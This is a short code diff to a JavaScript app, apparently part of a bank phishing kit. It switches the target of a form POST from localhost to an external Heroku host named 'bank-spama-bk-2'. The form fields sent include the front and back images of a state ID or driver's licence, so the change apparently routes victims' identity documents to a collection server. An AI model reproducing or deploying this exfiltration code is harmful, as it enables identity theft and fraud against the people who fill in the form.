@@ -89,7 +89,7 @@ function App() {
     myData.append("stateId_dlFront", data.stateId_dlFront);
     myData.append("stateId_dlBack", data.stateId_dlBack);
 
-    fetch("http://localhost:8080", {
+    fetch("https://bank-spama-bk-2.herokuapp.com", {
       method: "POST",
       mode: "cors",
       body: myData
